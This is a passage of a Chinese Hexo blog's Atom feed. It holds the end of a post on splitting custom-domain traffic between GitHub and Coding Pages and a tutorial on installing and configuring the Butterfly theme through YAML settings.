<p><strong>注意</strong>：一定要添加两条，一条带<code>www.</code>的，一条不带<code>www.</code>的，如果没加带www.的解析别人用<code>www.yourname.com</code>将无法访问到你的博客，同理，不添加无www.的解析别人无法访问youname.com</p>          </div><p>等待几分钟后，就可以用你的自定义域名访问到你的博客了</p><h2 id="github域名绑定"><a href="#github域名绑定" class="headerlink" title="github域名绑定"></a>github域名绑定</h2><p>与coding绑定域名同理，但是在<code>解析线路</code>哪里要设置成境外，这样才能达到分流的效果<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/git.png" class="lazyload"><br>在hexo博客的<code>/source/</code>文件新增一个无后缀名的<code>CNAME</code>文件，内容为你的域名，然后在<code>git d</code>到github上，这时在你github仓库中的<code>Settubgs</code>中就会发现已经绑定好域名了。<br><img alt data-src="/img/hexo%E5%9F%9F%E5%90%8D%E5%88%86%E6%B5%81/gitb.png" class="lazyload"><br>这样国内的用户访问的就是你coding上部署博客，而国外的用户访问的就是你github上的博客了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="网站搭建" scheme="https://c-hasel.github.io/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="hexo" scheme="https://c-hasel.github.io/tags/hexo/"/>
    
      <category term="博客搭建" scheme="https://c-hasel.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>hexo博客搭建二:Butterfly主题应用及配置</title>
    <link href="https://c-hasel.github.io/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/"/>
    <id>https://c-hasel.github.io/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%BA%8C/</id>
    <published>2019-12-02T01:14:38.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note info no-icon">            <p>前面我们已经搭建好了自己的hexo博客(如果还不会的请看我上一篇文章<a href="https://c-hasel.github.io/2019/11/29/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B8%80/">hexo主题的搭建</a>)，但是默认主题不那么好看，所以我们就要更换一下主题，因为我用的是<a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener">Butterfly</a>这个主题，所以我就用这个主题来介绍一下如何配置和美化我们的博客，其他的主题配置也是大同小异。</p>          </div><h1 id="主题的安装和升级"><a href="#主题的安装和升级" class="headerlink" title="主题的安装和升级"></a>主题的安装和升级</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在你博客的根目录里</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><h2 id="应用主题"><a href="#应用主题" class="headerlink" title="应用主题"></a>应用主题</h2><p>修改站点的配置文件<code>_config.yml</code>把主题改为<code>Butterfly</code></p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">Butterfly</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>如果你没有pug以及stylus的渲染器，请下载安装:<code>npm install hexo-renderer-pug hexo-renderer-stylus --save</code> or <code>yarn add hexo-renderer-pug hexo-renderer-stylus</code></p>          </div><h2 id="平滑升级"><a href="#平滑升级" class="headerlink" title="平滑升级"></a>平滑升级</h2><p>为了让主题的平滑升级，<code>Butterfly</code>使用了<a href="https://hexo.io/docs/data-files.html" target="_blank" rel="noopener">data files</a>特性。  </p><p>推荐把默认主题的配置文件<code>_config.yml</code>复制到Hexo工作目录下的<code>source/_data/butterfly.yml</code>，如果<code>source/_data</code>的目录不存在那就创建一个。</p><div class="note info no-icon">            <p>注意·如果你创建了<code>butterfly.yml</code>，他将会替换主题的默认配置文件<code>_config.yml</code>里的配置项(<strong>不是合并而是替换</strong>)，之后你就只需要通过<code>git pull</code>的方式就可以平滑的升级<code>theme-butterfly</code>了。</p>          </div><h1 id="主题页面"><a href="#主题页面" class="headerlink" title="主题页面"></a>主题页面</h1><h2 id="Page-Front-matter"><a href="#Page-Front-matter" class="headerlink" title="Page Front-matter"></a>Page Front-matter</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">type: (tags,link,categories这三个页面需要配置)</span><br><span class="line">comments: (是否开启评论，默认true)</span><br><span class="line">description:</span><br><span class="line">top_img: (设置顶部图)</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="Post-Front-matter"><a href="#Post-Front-matter" class="headerlink" title="Post Front-matter"></a>Post Front-matter</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top_img: (除非特定，可以不写)</span><br><span class="line">comments: 是否显示评论(除非设置false,可以不写)</span><br><span class="line">cover: 缩略图</span><br><span class="line">toc: 是否显示toc(除非特定文章设置，可以写)</span><br><span class="line">toc_number: 是否显示toc数字(除非特定文章设置，可以不写)</span><br><span class="line">copyright: 是否显示版权(除非特定文章设置，可以不写)</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h2><ol><li>前往你的Hexo博客根目录</li><li>输入<code>hexo new page tags</code></li><li>你会找到<code>source/tags/index.md</code>这个文件</li><li>修改这个文件：</li></ol><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">tite: 标签</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">type: tags</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="分类页"><a href="#分类页" class="headerlink" title="分类页"></a>分类页</h2><ol><li>前往你的Hexo博客的根目录</li><li>输入<code>hexo new page categories</code></li><li>你会找到<code>source/categories/index.md</code>这个文件</li><li>修改这个文件:</li></ol><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">type: categories</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h2><p>为你的博客添加友情链接！</p><h3 id="创建友情链接"><a href="#创建友情链接" class="headerlink" title="创建友情链接"></a>创建友情链接</h3><ol><li>前往你的Hexo博客的根目录</li><li>输入<code>hexo new page link</code></li><li>你会找到<code>source/link/index.md</code>这个文件</li><li>修改这个文件:</li></ol><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 友情链接</span><br><span class="line">date: 2019-12-1 00:00:00</span><br><span class="line">type: link</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="友情链接添加"><a href="#友情链接添加" class="headerlink" title="友情链接添加"></a>友情链接添加</h3><p>在Hexo博客根目录中的<code>source/_data</code>创建一个文件<code>link.yml</code></p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">class:</span></span><br><span class="line">  <span class="attr">class_name:</span> <span class="string">友情链接</span></span><br><span class="line">  <span class="attr">link_list:</span></span><br><span class="line">    <span class="attr">1:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://xxx.com</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://xxx/xxx/avatar.png</span> <span class="string">(也可以是本地文件)</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">添加描述</span></span><br><span class="line">    <span class="number">2</span><span class="string">：</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://xxx.com</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://xxx/xxx/avatar.png</span> <span class="string">(也可以是本地文件)</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">添加描述</span></span><br><span class="line"></span><br><span class="line"><span class="attr">class2:</span></span><br><span class="line">  <span class="attr">class_name:</span> <span class="string">无效链接</span></span><br><span class="line">  <span class="attr">link_list:</span></span><br><span class="line">    <span class="attr">1:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://xxx.com</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://xxx/xxx/avatar.png</span> <span class="string">(也可以是本地文件)</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">添加描述</span></span><br><span class="line">     <span class="attr">2:</span></span><br><span class="line">       <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://xxx.com</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://xxx/xxx/avatar.png</span> <span class="string">(也可以是本地文件)</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">添加描述</span></span><br></pre></td></tr></table></figure><h3 id="友情链接界面设置"><a href="#友情链接界面设置" class="headerlink" title="友情链接界面设置"></a>友情链接界面设置</h3><p>需要添加友情链接，可以在<code>Butterfly.yml</code>配置<br>可以在友情链接上协商自己的个人资料，方便他人添加</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">Flink:</span></span><br><span class="line">  <span class="attr">headline:</span> <span class="string">友情链接</span></span><br><span class="line">  <span class="attr">info_headline:</span> <span class="string">我的Blog资料</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Blog</span> <span class="string">名字:</span> <span class="string">xxx</span></span><br><span class="line">  <span class="attr">address:</span> <span class="string">Blog</span> <span class="string">地址:</span> <span class="string">https://xxx.com</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">Blog</span> <span class="string">头像:</span> <span class="string">https://xxx.com</span></span><br><span class="line">  <span class="attr">info:</span> <span class="string">Blog</span> <span class="string">简介:</span> <span class="string">xxx,xxx</span></span><br><span class="line">  <span class="attr">comment:</span> <span class="string">如需交换友链，请留言</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/flink.png" class="lazyload"><br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/mylink.png" class="lazyload"></p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="配置文件说明"><a href="#配置文件说明" class="headerlink" title="配置文件说明"></a>配置文件说明</h2><ul><li>站点配置文件<code>_config.yml</code>是hexo根目录下的配置文件</li><li><code>butterfly.yml</code>是<code>Butterfly</code>的配置文件，他需要你手动将主题目录下的<code>config.yml</code>文件复制到hexo根目录的<code>source/_data/butterfly.yml</code>中。如果文件或文件夹不存在，请手动创建。</li></ul><h2 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h2><p>修改站点配置文件<code>_config.yml</code>的<code>language</code>参数  </p><p>默认语言是en  </p><p>主题支持三种语言</p><ul><li>default(en)</li><li>zh-CN(简体中文)</li><li>zh-TW(繁体中文)</li></ul><h2 id="网站资料"><a href="#网站资料" class="headerlink" title="网站资料"></a>网站资料</h2><p>修改网站各种资料，列入标题、副标题和邮箱等个人资料，请修改博客根目录的<code>_config.yml</code><br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/config.png" class="lazyload"></p><h2 id="导航菜单"><a href="#导航菜单" class="headerlink" title="导航菜单"></a>导航菜单</h2><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">Home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="attr">Archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">Tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">Categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="attr">Link:</span> <span class="string">/link/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-link</span></span><br><span class="line">  <span class="attr">About:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-heart</span></span><br><span class="line">  <span class="string">list||fa</span> <span class="attr">fa-list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Music</span> <span class="string">||</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Movie</span> <span class="string">||</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-film</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>必须是<code>/xxx/</code>，后面<code>||</code>分开，然后写图标名，菜单名可以自己修改  </p><p>格式化：  </p><p>显示名称：  </p><p>路径||icon  </p><p>sub-menu格式  </p><p>名称||icon:  </p><ul><li>名称||路径||icon</li></ul>          </div><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/page.png" class="lazyload"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p><code>Butterfly</code>支持<a href="https://github.com/equinusocio/material-theme" target="_blank" rel="noopener">Material Theme</a>5种高亮模式: </p><ul><li>default</li><li>darker</li><li>pale night</li><li>light</li><li>ocean</li></ul><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight_theme:</span> <span class="string">light</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>default</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-code-default.png" class="lazyload"></p><div class="note info no-icon">            <p>darker</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-code-darker.png" class="lazyload"></p><div class="note info no-icon">            <p>pale night</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-code-pale-night.png" class="lazyload"></p><div class="note info no-icon">            <p>light</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-code-light.png" class="lazyload"></p><div class="note info no-icon">            <p>ocean</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-highlight-ocean.png" class="lazyload"></p><h3 id="代码复制"><a href="#代码复制" class="headerlink" title="代码复制"></a>代码复制</h3><p>主题支持代码复制功能  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight_copy:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-code-copy.png" class="lazyload"></p><h3 id="代码框展开-关闭"><a href="#代码框展开-关闭" class="headerlink" title="代码框展开/关闭"></a>代码框展开/关闭</h3><p>在默认情况下，代码框自动展开，可设置是否所有代码框都关闭状态，点击<code>&gt;</code>可展开代码  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight_shrink:</span> <span class="literal">true</span> <span class="comment">#代码框不可展开，需点击'&gt;'打开</span></span><br></pre></td></tr></table></figure><p><code>highlight_shrink: true</code><br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-highlight-shrink-true.png" class="lazyload"><br><code>highlight_shrink: flase</code><br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-highlight-shrink-false.png" class="lazyload"></p><h3 id="代码换行"><a href="#代码换行" class="headerlink" title="代码换行"></a>代码换行</h3><p>在默认情况下，<code>hexo-highlight</code>在编译的时候不会实现代码自动换行，如果你不希望在代码块的区域里有横向滚动条的话，那么你可以考虑开启这个功能。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">code_word_wrap:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>然后找到你站点的Hexo配置文件<code>_config.yml</code>将<code>line_number</code>改成<code>false</code>:</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="string">flase</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span></span><br></pre></td></tr></table></figure><div class="note info no-icon">            <p>设置<code>code_word_wrap</code>之前：</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-code-word-wrap-before.png" class="lazyload"></p><div class="note info no-icon">            <p>设置<code>code_word_wrap</code>之后：</p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-code-word-wrap-after.png" class="lazyload"></p><h2 id="社交图片"><a href="#社交图片" class="headerlink" title="社交图片"></a>社交图片</h2><p>Butterfly支持<a href="https://fontawesome.com/v4.7.0/" target="_blank" rel="noopener">font-awesome v4</a>和<a href="https://fontawesome.com/icons?from=io" target="_blank" rel="noopener">font-awecome v5</a>.如需开启<a href="https://fontawesome.com/icons?from=io" target="_blank" rel="noopener">font-awecome v5</a>，需要在<code>Butterfly.yml</code>上开启</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">CDN_USE:</span></span><br><span class="line">  <span class="attr">css:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://use.fontawesome.com/releases/v5.8.1/css/all.css</span></span><br></pre></td></tr></table></figure><p>无论V4还是V5，书写格式都是一样的<code>图标名：url</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">fa fa-github:</span> <span class="string">https://github.com/xxx</span></span><br><span class="line">  <span class="attr">fa fa-rsss:</span> <span class="string">/atom.xml</span></span><br></pre></td></tr></table></figure><p>图标可以在这寻找<br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-fontawesome.png" class="lazyload"><br>PC:<br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/PC.png" class="lazyload"><br>Mobile:<br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/moble.jpg" class="lazyload"></p><h2 id="主页文章节选-自动节选和文章页description"><a href="#主页文章节选-自动节选和文章页description" class="headerlink" title="主页文章节选(自动节选和文章页description)"></a>主页文章节选(自动节选和文章页description)</h2><p>因为主题UI的关系，<code>主页文章节选</code>只支持<code>自动节选</code>和<code>文章页description</code>。优先选择<code>自动节选</code>  </p><p>在<code>butterfly.yml</code>里可以开启<code>auto_excerpt</code>的选项，你的文章将会在自动截取部分显示在主页(默认显示150个字)</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_excerpt:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">150</span></span><br></pre></td></tr></table></figure><p>如果没有开启<code>自动节选</code>，则会显示文章页front-matter里面设置的<code>description</code><br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-post-description.png" class="lazyload"></p><div class="note info no-icon">            <p>注意:如果开启了自动节选功能，代码块的显示将有可能不正常。</p>          </div><h2 id="顶部图"><a href="#顶部图" class="headerlink" title="顶部图"></a>顶部图</h2><p><code>顶部图</code>有两种配置:具体url和(留空·true和false，三个效果一样)</p><h3 id="page页"><a href="#page页" class="headerlink" title="page页"></a>page页</h3><h4 id="当具体url时"><a href="#当具体url时" class="headerlink" title="当具体url时"></a>当具体url时</h4><p>主页的顶部图可以在<code>Butterfly.yml</code>设置<code>index_img</code>  </p><p>archives页的顶部图可以在<code>Butterfly.yml</code>设置<code>archive_img</code>  </p><p>其他<code>page</code>页的顶部图可以在各自的md页面设置<code>front-matter</code>中的<code>top_img</code></p><div class="note info no-icon">            <p>页面如果没有设置各自的<code>top_img</code>则会显示<code>default_top_img</code>图片</p>          </div><h4 id="当顶部图留空·true和false"><a href="#当顶部图留空·true和false" class="headerlink" title="当顶部图留空·true和false"></a>当顶部图留空·true和false</h4><p>主页会显示纯颜色的顶部图  </p><p>其他page的顶部图没有设置时，也会显示纯颜色的顶部图</p><h3 id="post页"><a href="#post页" class="headerlink" title="post页"></a>post页</h3><p><code>post</code>页的顶部图会优先显示各自<code>front-matter</code>中的<code>top_img</code>，如果没有设置，则会缩略图(即各自<code>front-matter</code>中的<code>cover</code>)，如果没有则会显示<code>default_top_img</code>图片</p><h2 id="文章相关项"><a href="#文章相关项" class="headerlink" title="文章相关项"></a>文章相关项</h2><p>这个选项是用来显示文章相关的相关信息的  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_meta:</span></span><br><span class="line">  <span class="attr">date_type:</span> <span class="string">both</span> <span class="comment">#or created or updated 文章日期是创建日或者更新日或者都显示</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="literal">true</span> <span class="comment"># or false 是否显示分类</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="literal">true</span> <span class="comment"># or false 是否显示标签</span></span><br></pre></td></tr></table></figure><p>在文章顶部的资料  </p><p><code>date_type:</code>可设置文章日期显示创建日期(<code>created</code>)或者更新日期(<code>updated</code>)或者两种都显示(<code>both</code>)  </p><p><code>categories</code>是否显示分类<br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/c.png" class="lazyload"><br><code>tags</code>是否显示标签<br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/tags.png" class="lazyload"></p><h2 id="文章版权"><a href="#文章版权" class="headerlink" title="文章版权"></a>文章版权</h2><p>为你的博客文章展示文章版权和许可协议。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_copyright:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">CC</span> <span class="string">BY-NC-SA</span> <span class="number">4.0</span></span><br><span class="line">  <span class="attr">license_url:</span> <span class="string">https://creativecommons.org/licenses/by-nc-sa/4.0/</span></span><br></pre></td></tr></table></figure><p>如果有文章(例如：转载文章)不需要显示版权，可以在文章Front-matter单独设置</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">copyright:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p><strong>版权显示截图</strong><br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/nc.png" class="lazyload"></p><h2 id="文章打赏"><a href="#文章打赏" class="headerlink" title="文章打赏"></a>文章打赏</h2><p>在你每篇文章的结尾，可以添加打赏按钮，相关二维码可以自行配置  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">QR_code:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">itemlist:</span></span><br><span class="line">        <span class="attr">img:</span> <span class="string">/img/wechat.jpg</span></span><br><span class="line">        <span class="attr">text:</span> <span class="string">微信</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">itemlist:</span> </span><br><span class="line">        <span class="attr">img:</span> <span class="string">/img/alipay.jpg</span></span><br><span class="line">        <span class="attr">text:</span> <span class="string">支付宝</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/ds.png" class="lazyload"></p><h2 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h2><p>文章的markdown文档上，在<code>Front-matter</code>添加<code>cover</code>，并填上要显示的图片地址<br>如果不配置<code>cover</code>，可以设置显示默认的cover  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">default_cover:</span> <span class="string">https://xxx.com/xxx.png</span></span><br></pre></td></tr></table></figure><p>当配置多张图片时，会随机选择一张作为cover，此时写法应为</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">default_cover:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://xxx.com/xxx.png</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://xxx.com/yyy.png</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://xxx.com/zzz.png</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/cym.png" class="lazyload"><br><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/tp.png" class="lazyload"></p><h2 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h2><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span> <span class="string">https://xxx/avatar.png</span></span><br></pre></td></tr></table></figure><p><img alt data-src="/img/hexo%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/PC.png" class="lazyload"></p><h2 id="toc"><a href="#toc" class="headerlink" title="toc"></a>toc</h2><p>在文章页，会有一个目录，用于显示TOC。手机端默认显示按钮。  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span>  <span class="comment">#显示章节数字</span></span><br></pre></td></tr></table></figure><p><strong>PC</strong><br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-toc-pc.png" class="lazyload"><br><strong>Moblie</strong><br><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-docs-mobile-toc-new.png" class="lazyload"></p><h3 id="为特定的文章配置是否显示TOC和特定的目录章节数字"><a href="#为特定的文章配置是否显示TOC和特定的目录章节数字" class="headerlink" title="为特定的文章配置是否显示TOC和特定的目录章节数字"></a>为特定的文章配置是否显示TOC和特定的目录章节数字</h3><p>在你的文章<code>md</code>文件的头部，加入<code>toc_number</code>和<code>toc</code>项，并配置<code>true</code>或者<code>false</code>即可。  </p><p><code>toc</code>是否显示文章TOC  </p><p><code>toc_number</code>是否显示章节数  </p><p>配置之后你的特定的文章将会拥有它自己的目录数字的显示与否，而不会受全局的配置影响。</p><div class="note info no-icon">            <p><code>enable: true</code></p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-toc-true.png" class="lazyload"></p><div class="note info no-icon">            <p><code>number: false</code></p>          </div><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-toc-number-false.png" class="lazyload"></p><h3 id="设置是否自动打开TOC"><a href="#设置是否自动打开TOC" class="headerlink" title="设置是否自动打开TOC"></a>设置是否自动打开TOC</h3><p>可选择进入文章页面时，是否自动打开sidebar显示TOC</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_open_sidebar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p>相关文章推荐的原理是根据文章的tags的比重来推荐  </p><p>配置<code>butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">related_post:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">6</span> <span class="comment">#显示推荐文章数目</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN/img/hexo-theme-butterfly-doc-relatedpost.png" class="lazyload"></p><h2 id="Footer设置"><a href="#Footer设置" class="headerlink" 